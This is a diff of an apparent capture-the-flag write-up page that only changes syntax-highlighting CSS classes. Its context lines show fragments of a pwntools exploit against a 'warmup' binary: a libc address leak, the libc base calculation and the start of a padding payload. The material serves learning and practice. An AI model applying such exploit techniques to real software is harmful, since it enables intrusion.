@@ -199,7 +199,7 @@ Program received signal SIGINT, Interrupt.
 
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./warmup"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
-libc_base </span><span class="o">=</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">  
+libc_base </span><span class="o">=</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">  
 log.info(</span><span class="no">f</span><span class="s">"Libc base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
 
 shell.interactive()</span>
@@ -303,7 +303,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./warmup"</span><span class="p">,</span><span class="s"> "b *0x401281</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
 
-libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">  
+libc_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">  
 
 payload1</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
 payload1</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
@@ -400,7 +400,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./warmup"</span><span class="p">)
 
-libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">
+libc_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">
 
 payload1</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
 payload1</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="c1">                  # padding for leave</span><span class="p">
